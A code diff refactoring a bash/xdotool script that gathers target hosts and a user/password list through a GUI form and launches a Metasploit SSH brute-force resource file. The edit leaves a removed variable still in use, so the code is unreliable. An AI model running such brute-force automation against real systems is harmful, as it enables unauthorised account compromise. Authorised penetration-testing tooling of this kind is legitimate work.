@@ -4,27 +4,25 @@
 ssh: bruteforce userpass file (user pass)
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
-source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+RHOSTS_FIELD=$(form_item  "RHOSTS" "RHOSTS")
+USERPASS_FILE_FIELD=$(form_item  "USERPASS_FILE" "USERPASS_FILE")
 
-# Generate gui form
-generate_form "RHOSTS" "USERPASS_FILE"
+# Generate GUI form
+generate_form "${RHOSTS_FIELD}" "${USERPASS_FILE_FIELD}"
 
 RHOSTS=${form_data["RHOSTS"]}
 USERPASS_FILE=${form_data["USERPASS_FILE"]}
 
-FILES_FOLDER="$HOME/Desktop/base/code/xdotool/scripts/ssh/.files"
+FILES_FOLDER="${SCRIPTS_DIR}/ssh/.files"
 
-SRC_FILE="${FILES_FOLDER}/msfconsole_brute_force_ssh_userpass_file.rc"
-TMP_FILE="${FILES_FOLDER}/msfconsole_brute_force_ssh_userpass_file_tmp.rc"
+# Define replacement fields
+REPLACE_FIELDS=(
+    "[USERPASS_FILE]" "${USERPASS_FILE}"
+    "[RHOSTS]" "${RHOSTS}"
+)
 
-ls ${FILES_FOLDER}
-
-replace_in_file "${SRC_FILE}" "${TMP_FILE}" "[USERPASS_FILE]" "${USERPASS_FILE}" "[RHOSTS]" "${RHOSTS}" 
+find_and_replace_file "${FILES_FOLDER}" "msfconsole_brute_force_ssh_userpass_file" "${REPLACE_FIELDS[@]}"
 
 paste_command "msfconsole -r ${TMP_FILE}"
 xdotool key Return
-
-sleep 120
-rm $TMP_FILE
